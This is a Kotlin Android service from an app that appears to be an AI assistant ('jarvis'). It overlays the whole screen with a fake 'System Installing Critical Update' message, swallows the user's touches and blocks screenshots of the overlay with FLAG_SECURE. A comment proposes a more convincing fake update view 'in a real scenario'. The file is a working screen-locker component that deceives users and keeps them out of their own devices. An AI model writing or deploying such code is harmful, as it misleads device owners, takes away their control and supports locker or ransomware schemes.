package com.ai.assistant.jarvis

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.os.Build
import android.os.IBinder
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.widget.TextView

class LockoutService : Service() {

    private lateinit var windowManager: WindowManager
    private lateinit var lockoutView: View

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        showLockoutScreen()
    }

    private fun showLockoutScreen() {
        if (!PermissionManager.hasOverlayPermission(this)) return

        val layoutParams = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_SECURE, // Prevent screenshots/recording of this layer
            PixelFormat.TRANSLUCENT
        )
        layoutParams.gravity = Gravity.CENTER

        // In a real scenario, inflate a complex "System Update" view
        lockoutView = TextView(this).apply {
            text = "System Installing Critical Update...\nPlease wait. Do not turn off device."
            setBackgroundColor(android.graphics.Color.BLACK)
            setTextColor(android.graphics.Color.WHITE)
            gravity = Gravity.CENTER
            textSize = 24f
            // Consume touches
            setOnTouchListener { _, _ -> true }
        }

        windowManager.addView(lockoutView, layoutParams)
    }

    override fun onDestroy() {
        super.onDestroy()
        if (::lockoutView.isInitialized) {
            windowManager.removeView(lockoutView)
        }
    }
}
